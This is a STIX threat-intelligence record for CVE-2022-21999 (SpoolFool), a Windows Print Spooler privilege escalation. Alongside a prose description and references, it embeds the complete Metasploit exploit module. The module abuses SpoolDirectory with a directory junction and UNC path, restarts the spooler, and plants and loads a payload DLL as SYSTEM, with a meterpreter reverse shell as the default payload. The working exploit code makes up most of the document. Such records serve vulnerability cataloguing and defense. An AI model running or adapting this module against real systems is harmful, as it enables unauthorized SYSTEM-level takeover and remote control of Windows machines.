{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--09c3c387-de79-4211-9767-244ed99776c4",
    "created": "2024-08-14T16:49:42.144965Z",
    "modified": "2024-08-14T16:49:42.144969Z",
    "name": "CVE-2022-21999 SpoolFool Privesc",
    "description": " The Windows Print Spooler has a privilege escalation vulnerability that can be leveraged to achieve code execution as SYSTEM.  The `SpoolDirectory`, a configuration setting that holds the path that a printer's spooled jobs are sent to, is writable for all users, and it can be configured via `SetPrinterDataEx()` provided the caller has the `PRINTER_ACCESS_ADMINISTER` permission. If the `SpoolDirectory` path does not exist, it will be created once the print spooler reinitializes.  Calling `SetPrinterDataEx()` with the `CopyFiles\\` registry key will load the dll passed in as the `pData` argument, meaning that writing a dll to the `SpoolDirectory` location can be loaded by the print spooler.  Using a directory junction and UNC path for the `SpoolDirectory`, the exploit writes a payload to `C:\\Windows\\System32\\spool\\drivers\\x64\\4` and loads it by calling `SetPrinterDataEx()`, resulting in code execution as SYSTEM.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2022_21999_spoolfool_privesc.rb",
            "external_id": "cve_2022_21999_spoolfool_privesc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-21999"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Windows::FileSystem\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CVE-2022-21999 SpoolFool Privesc',\n        'Description' => %q{\n          The Windows Print Spooler has a privilege escalation vulnerability that\n          can be leveraged to achieve code execution as SYSTEM.\n\n          The `SpoolDirectory`, a configuration setting that holds the path that\n          a printer's spooled jobs are sent to, is writable for all users, and it can\n          be configured via `SetPrinterDataEx()` provided the caller has the\n          `PRINTER_ACCESS_ADMINISTER` permission. If the `SpoolDirectory` path does not\n          exist, it will be created once the print spooler reinitializes.\n\n          Calling `SetPrinterDataEx()` with the `CopyFiles\\` registry key will load the\n          dll passed in as the `pData` argument, meaning that writing a dll to the `SpoolDirectory`\n          location can be loaded by the print spooler.\n\n          Using a directory junction and UNC path for the `SpoolDirectory`, the exploit\n          writes a payload to `C:\\Windows\\System32\\spool\\drivers\\x64\\4` and loads it\n          by calling `SetPrinterDataEx()`, resulting in code execution as SYSTEM.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Oliver Lyak', # Vuln discovery and PoC\n          'Shelby Pace' # metasploit module\n        ],\n        'Platform' => [ 'win' ],\n        'Arch' => ARCH_X64,\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [\n            'Auto',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X64,\n              'DefaultOptions' => {\n                'Payload' => 'windows/x64/meterpreter/reverse_tcp',\n                'PrependMigrate' => true\n              }\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'References' => [\n          [ 'URL', 'https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81'],\n          [ 'CVE', '2022-21999']\n        ],\n        'DisclosureDate' => '2022-02-08',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'AKA' => [ 'SpoolFool' ],\n          'Stability' => [ CRASH_SERVICE_RESTARTS ],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('PATH', [ true, 'Path to hold the payload', '%TEMP%' ]),\n        OptInt.new('WAIT_TIME', [ true, 'Time to wait in seconds for spooler to restart', 5 ])\n      ]\n    )\n  end\n\n  def check\n    unless session.platform == 'windows'\n      return CheckCode::Safe('This module only supports Windows targets.')\n    end\n\n    version = get_version_info\n\n    if version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1)\n      return CheckCode::Safe('Windows 7 is technically vulnerable, though it requires a reboot.')\n    elsif version.build_number.between?(Msf::WindowsVersion::Win10_InitialRelease, Msf::WindowsVersion::Win10_21H2) ||\n          version.build_number == Msf::WindowsVersion::Server2022 ||\n          version.build_number == Msf::WindowsVersion::Win11_21H2\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def winspool\n    session.railgun.winspool\n  end\n\n  def spoolss\n    session.railgun.spoolss\n  end\n\n  def advapi32\n    session.railgun.advapi32\n  end\n\n  def get_printer_name\n    if target_is_server?\n      return \"#{get_default_printer}\\x00\"\n    end\n\n    \"#{Rex::Text.rand_text_alpha(5..12)}\\x00\"\n  end\n\n  def target_is_server?\n    version = get_version_info\n    version.windows_server?\n  end\n\n  # Windows usually has Print to PDF or XPS Document Writer\n  # available by default\n  def get_default_printer\n    xps = 'Microsoft XPS Document Writer'\n    pdf = 'Microsoft Print to PDF'\n\n    local_const = session.railgun.const('PRINTER_ENUM_LOCAL')\n    ret = winspool.EnumPrintersA(\n      local_const,\n      nil,\n      1,\n      nil,\n      0,\n      8,\n      8\n    )\n\n    unless ret['pcbNeeded'] > 0\n      fail_with(Failure::UnexpectedReply, 'Failed to determine bytes needed for enumerating printers.')\n    end\n\n    bytes_needed = ret['pcbNeeded']\n    ret = winspool.EnumPrintersA(\n      local_const,\n      nil,\n      1,\n      bytes_needed,\n      bytes_needed,\n      8,\n      8\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to enumerate local printers.') unless ret['return']\n    printer_struct = ret['pPrinterEnum']\n\n    return xps if printer_struct.include?(xps)\n    return pdf if printer_struct.include?(pdf)\n  end\n\n  def get_driver_name\n    if @printer_name.include?('XPS') || !target_is_server?\n      return \"Microsoft XPS Document Writer v4\\x00\"\n    end\n\n    \"Microsoft Print To PDF\\x00\"\n  end\n\n  # packs struct according to member types and data\n  def get_printer_info_struct\n    server_name = \"#{Rex::Text.rand_text_alpha(5..12)}\\x00\"\n    port_name = \"LPT1:\\x00\"\n    driver_name = get_driver_name\n    print_proc_name = \"winprint\\x00\"\n    p_datatype = \"RAW\\x00\"\n\n    print_strs = \"#{server_name}#{@printer_name}#{port_name}#{driver_name}#{print_proc_name}#{p_datatype}\"\n    base = session.railgun.util.alloc_and_write_string(print_strs)\n\n    fail_with(Failure::UnexpectedReply, 'Failed to allocate strings for PRINTER_INFO_2 structure.') unless base\n\n    print_info_struct = [\n      base + print_strs.index(server_name),\n      base + print_strs.index(@printer_name), 0,\n      base + print_strs.index(port_name),\n      base + print_strs.index(driver_name), 0, 0, 0, 0,\n      base + print_strs.index(print_proc_name),\n      base + print_strs.index(p_datatype), 0, 0,\n      client.railgun.const('PRINTER_ATTRIBUTE_LOCAL'),\n      0, 0, 0, 0, 0, 0, 0\n    ]\n\n    # https://docs.microsoft.com/en-us/windows/win32/printdocs/printer-info-2\n    print_info_struct.pack('QQQQQQQQQQQQQLLLLLLLL')\n  end\n\n  def add_printer\n    struct = get_printer_info_struct\n    fail_with(Failure::UnexpectedReply, 'Failed to create PRINTER_INFO_2 STRUCT.') unless struct\n\n    ret = winspool.AddPrinterA(nil, 2, struct)\n    fail_with(Failure::UnexpectedReply, ret['ErrorMessage']) if ret['GetLastError'] != 0\n\n    print_good(\"Printer #{@printer_name} was successfully added.\")\n    ret['return']\n  end\n\n  def set_spool_directory(handle, spool_dir)\n    print_status(\"Setting spool directory: #{spool_dir}\")\n    ret = set_printer_data(handle, '\\\\', 'SpoolDirectory', spool_dir)\n\n    unless ret['GetLastError'] == 0\n      fail_with(Failure::UnexpectedReply, 'Failed to set spool directory.')\n    end\n  end\n\n  def restart_spooler(handle)\n    print_status('Attempting to restart print spooler.')\n    term_path = 'C:\\\\Windows\\\\System32\\\\AppVTerminator.dll'\n    ret = set_printer_data(handle, 'CopyFiles\\\\', 'Module', term_path)\n    unless ret['GetLastError'] == 0\n      fail_with(Failure::UnexpectedReply, 'Failed to terminate print spooler service.')\n    end\n  end\n\n  def set_printer_data(handle, key_name, value_name, config_data)\n    winspool.SetPrinterDataExA(handle,\n                               key_name,\n                               value_name,\n                               REG_SZ,\n                               config_data,\n                               config_data.length)\n  end\n\n  # set read / execute permissions on dll\n  # first get the security info in order to modify it\n  # and pass back to SetNamedSecurityInfo()\n  def set_perms_on_payload\n    obj_type = session.railgun.const('SE_FILE_OBJECT')\n    sec_info = session.railgun.const('DACL_SECURITY_INFORMATION')\n    ret = advapi32.GetNamedSecurityInfoA(\n      @payload_path,\n      obj_type,\n      sec_info,\n      nil,\n      nil,\n      8,\n      nil,\n      8\n    )\n\n    unless ret['return'] == 0\n      fail_with(Failure::UnexpectedReply, 'Failed to get payload security info.')\n    end\n\n    ret = advapi32.BuildExplicitAccessWithNameA(\n      '\\x00' * 48,\n      'SYSTEM',\n      session.railgun.const('GENERIC_ALL'),\n      session.railgun.const('GRANT_ACCESS'),\n      session.railgun.const('NO_INHERITANCE')\n    )\n\n    ea_struct = ret['pExplicitAccess']\n    if ea_struct.empty?\n      fail_with(Failure::UnexpectedReply, 'Failed to retrieve EXPLICIT_ACCESS structure.')\n    end\n\n    ret = advapi32.SetEntriesInAclA(1, ea_struct, nil, 8)\n    fail_with(Failure::UnexpectedReply, \"Failed to create new ACL: #{ret['GetLastError']}\") if ret['return'] != 0\n\n    # need to first access pointer to the new acl\n    # in order to read the acl's header (8 bytes) to determine\n    # size of entire acl structure\n    new_acl_ptr = ret['NewAcl'].unpack('Q').first\n    acl_header = session.railgun.util.memread(new_acl_ptr, 8)\n\n    # https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-acl\n    acl_mems = acl_header.unpack('CCSSS')\n    struct_size = acl_mems&.at(2)\n\n    unless struct_size\n      fail_with(Failure::UnexpectedReply, 'Failed to retrieve size of ACL structure.')\n    end\n\n    acl_struct = session.railgun.util.memread(new_acl_ptr, struct_size)\n    ret = advapi32.SetNamedSecurityInfoA(\n      @payload_path,\n      obj_type,\n      sec_info,\n      nil,\n      nil,\n      acl_struct,\n      nil\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to set permissions on payload.') if ret['return'] != 0\n    print_status('Payload should have read / execute permissions now.')\n  end\n\n  def open_printer\n    print_ptr = session.railgun.util.alloc_and_write_string('RAW')\n    lp_default = [ print_ptr, 0, session.railgun.const('PRINTER_ACCESS_ADMINISTER') ]\n    lp_default_struct = lp_default.pack('QQS')\n\n    winspool.OpenPrinterA(@printer_name, 8, lp_default_struct)\n  end\n\n  def dir_path\n    datastore['PATH']\n  end\n\n  def count\n    datastore['WAIT_TIME']\n  end\n\n  def to_unc(path)\n    path.gsub('C:', '\\\\\\\\\\localhost\\\\C$')\n  end\n\n  def write_and_load_dll(handle)\n    payload_name = \"#{Rex::Text.rand_text_alpha(5..12)}.dll\"\n    payload_data = generate_payload_dll\n    @payload_path = \"#{@v4_dir}\\\\#{payload_name}\"\n    register_file_for_cleanup(@payload_path)\n    register_dir_for_cleanup(@v4_dir)\n\n    print_status(\"Writing payload to #{@payload_path}.\")\n    unless write_file(@payload_path, payload_data)\n      fail_with(Failure::UnexpectedReply, 'Failed to write payload.')\n    end\n\n    print_status('Attempting to set permissions for payload.')\n    set_perms_on_payload\n    set_printer_data(handle, 'CopyFiles\\\\', 'Module', @payload_path)\n  end\n\n  def exploit\n    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?\n\n    unless session.arch == ARCH_X64\n      fail_with(Failure::BadConfig, 'This exploit only supports x64 sessions')\n    end\n\n    @printer_name = get_printer_name\n    tmp_dir = Rex::Text.rand_text_alpha(5..12)\n    tmp_path = expand_path(\"#{dir_path}\\\\#{tmp_dir}\")\n\n    # the user name may get truncated which won't work\n    # when setting the UNC path\n    dirs = tmp_path.split('\\\\')\n    if dirs.index('Users')\n      full_uname = client.sys.config.getuid.split('\\\\').last\n      dirs[dirs.index('Users') + 1] = full_uname\n      tmp_path = dirs.join('\\\\')\n    end\n\n    print_status(\"Making base directory: #{tmp_path}\")\n    unless mkdir(tmp_path)\n      fail_with(Failure::NoAccess,\n                'Permissions may be insufficient.' \\\n                'Consider choosing a different base path for the exploit.')\n    end\n\n    handle = nil\n    if target_is_server?\n      ret = open_printer\n      fail_with(Failure::UnexpectedReply, 'Failed to open default printer.') unless ret['return']\n      handle = ret['phPrinter']\n    else\n      handle = add_printer\n    end\n\n    driver_dir = 'C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64'\n    @v4_dir = \"#{driver_dir}\\\\4\"\n    fail_with(Failure::NotFound, 'Driver directory not found.') unless directory?(driver_dir)\n\n    # if directory already exists, attempt the exploit\n    if directory?(@v4_dir)\n      print_status('v4 directory already exists.')\n    else\n      set_spool_directory(handle, to_unc(\"#{tmp_path}\\\\4\"))\n      print_status(\"Creating junction point: #{tmp_path} -> #{driver_dir}\")\n      junction = create_junction(tmp_path, driver_dir)\n      fail_with(Failure::UnexpectedReply, 'Failed to create junction point.') unless junction\n\n      # now restart spooler to create spool directory\n      print_status('Creating the spool directory by restarting spooler...')\n      restart_spooler(handle)\n      print_status(\"Sleeping for #{count} seconds.\")\n      Rex.sleep(count)\n\n      ret = open_printer\n      unless ret['return']\n        fail_with(Failure::Unreachable, 'The print spooler service failed to start.')\n      end\n\n      handle = ret['phPrinter']\n      unless directory?(@v4_dir)\n        fail_with(Failure::UnexpectedReply, 'Directory was not created.')\n      end\n\n      print_good('Directory was successfully created.')\n    end\n\n    write_and_load_dll(handle)\n  ensure\n    if handle && !target_is_server?\n      spoolss.DeletePrinter(handle)\n    end\n\n    spoolss.ClosePrinter(handle) unless handle.nil?\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-08",
    "x_mitre_platforms": [
        "win'"
    ]
}